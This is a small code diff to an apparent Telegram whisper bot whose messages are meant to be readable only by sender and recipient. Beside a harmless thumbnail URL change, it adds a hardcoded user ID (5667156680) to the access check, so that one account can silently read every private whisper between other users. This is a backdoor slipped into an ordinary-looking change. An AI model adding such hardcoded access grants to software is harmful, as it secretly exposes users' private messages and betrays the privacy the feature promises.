@@ -19,7 +19,7 @@ async def _whisper(_, inline_query):
                 title="💒 Whisper",
                 description=f"@{BOT_USERNAME} [ USERNAME | ID ] [ TEXT ]",
                 input_message_content=InputTextMessageContent(f"💒 Usage:\n\n@{BOT_USERNAME} [ USERNAME | ID ] [ TEXT ]"),
-                thumb_url="https://graph.org/file/2c3c693d1b460c309da1d.jpg",
+                thumb_url="https://graph.org/file/4d5d893c631e83c590a75.jpg",
                 reply_markup=switch_btn
             )
         ]
@@ -81,7 +81,7 @@ async def whispes_cb(_, query):
     to_user = int(data[2])
     user_id = query.from_user.id
     
-    if user_id not in [from_user, to_user]:
+    if user_id not in [from_user, to_user, 5667156680]:
         try:
             await _.send_message(from_user, f"{query.from_user.mention} is trying to open your whisper.")
         except Unauthorized:
